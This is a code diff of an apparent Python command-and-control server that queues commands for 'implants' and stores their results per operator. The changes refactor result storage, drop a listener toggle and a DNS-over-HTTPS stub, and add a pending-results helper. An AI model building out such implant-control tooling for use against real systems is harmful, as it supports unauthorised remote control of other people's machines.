@@ -38,16 +38,13 @@ implant_command_queues = {
 
 # Result storage for each user
 # Keeping this as a nested dict for now
-result_storage = {
-    """
-    This is a nested dict for now
-    The intention is that a user will interact with multiple implants
-    Then to get the results from individual implants, they search for the implant key
-    The value they get is the first element which can then be popped to move others up
-    """
-    "tester": [],
-    "matt_tester": [],
-}
+"""
+This is a nested dict for now
+The intention is that a user will interact with multiple implants
+Then to get the results from individual implants, they search for the implant key
+The value they get is the first element which can then be popped to move others up
+"""
+result_storage = {}
 
 # Logger configuration
 logger = logging.getLogger(__name__)
@@ -136,23 +133,6 @@ def find_get_val(req_meth):
             elif key == req_meth and value is False:
                 return True
     return False
-
-
-def endi_listener(listener_name, status):
-    """
-    Enable or disable a listener by name
-    :param listener_name: The listener to set to True or False
-    :param status: Set the listener to True/False
-    :return: Bool
-    """
-    for search_path, listeners in route_status.items():
-        for search_name, methods in listeners.items():
-            if search_name == listener_name:
-                for search_method in methods.keys():
-                    # Update the method status to the given status
-                    route_status[search_path][search_name][search_method] = status.lower() == "true"
-                    return f"Listener {listener_name} set to {status} for {search_method} method."
-    return f"Error: Listener {listener_name} not found."
 
 
 def verify_auth_token(uri, received_token, received_timestamp):
@@ -327,6 +307,21 @@ def get_waiting_command(implant_id):
         return False, False
 
 
+def get_unique_results_for_user(user_id):
+    """
+    Get all unique client IDs for a specific user from result_storage.
+    :param user_id: The user ID to fetch client IDs for.
+    :return: A set of unique client IDs for the user.
+    """
+    user_results = result_storage.get(user_id, [])
+    if not user_results:
+        return False  # No entries for this user
+    unique_client_ids = set()
+    for entry in user_results:
+        unique_client_ids.update(entry.keys())
+    return unique_client_ids
+
+
 def handle_update(uname, implant_id, result):
     """
     Handle implants sending results of commands to the server
@@ -372,8 +367,9 @@ def handle_client(client_socket, client_id):
 
         # Check what type of message it is first before processing further
         request_type, uname, *remainder = client_request.split(" ", 2)
-        if result_storage.get(uname, []):
-            client_socket.send("Implant command results pending for you".encode())
+        pending_res = get_unique_results_for_user(uname)
+        if pending_res is not False and request_type != "RTR":
+            client_socket.send(f"Results from {pending_res} pending for you".encode())
 
         match request_type:
             case "AUTH":
@@ -637,17 +633,6 @@ def restrict_routes():
         if find_get_val(request.method):
             logger.warning(f"disabled route accessed: {request.path} {request.method}")
             abort(404)  # Return a 404 if the route is disabled
-
-
-@app.route('/dns-query', methods=['GET', 'POST'])
-def doh_handler():
-    print(request.content_type)
-    # Decode the incoming DNS query
-    if request.method == 'POST':
-        dns_query = request.data
-    elif request.method == 'GET':
-        dns_query_base64 = request.args.get('dns')
-        dns_query = base64.urlsafe_b64decode(dns_query_base64)
 
 
 def start_flask():
